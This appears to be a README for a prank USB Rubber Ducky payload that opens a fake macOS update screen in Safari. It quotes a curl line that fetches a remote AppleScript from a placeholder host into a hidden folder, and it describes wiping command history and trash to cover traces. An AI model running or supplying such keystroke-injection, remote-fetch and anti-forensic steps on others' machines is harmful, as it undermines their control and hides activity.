## Fake Update a Mac with Rubber Ducky
This is a text version of a rubber ducky payload I made. It basically opens a safari web browser on a mac and fullscreens it on fakeupdate.net/apple/index.html There is also an added chance that the script will run a delayed keystroke for the "Enter" key which will look like a kernel panic on the fakeupdate.net webpage. This script should clean itself up and delete command line data as well as emptying the mac trash permanently of just the cya directory we made

Requirements:
* USB Rubber Ducky
* some sort of hosting for the file "open.scpt"
* A mac 

Procedure/Usage:
* Firstly, upload the "open.scpt" file to your website
  * Example: www.example.com/open.scpt
* Next, in the ducky.txt file change the line that reads `STRING curl http://www.yoururlgoeshere > /Users/$USER/.cya/open.scpt` to reflect your website
* Now encode your ducky payload and wreak havoc upon your elitist apple friends (this is a joke, don't be stupid and be sure you have permissions to do so)

Issues:
* I tested this on one newer model mac, an early 2016 version and it seemed that the enter key never fired even when it should have. Upon further investigation it was firing but it seemed that for some reason the website wasn't responding to the keystroke (I tested this manually). It doesn't make sense and I did not have access to this mac long enough to thoroughly test, so I would love to get some feedback on this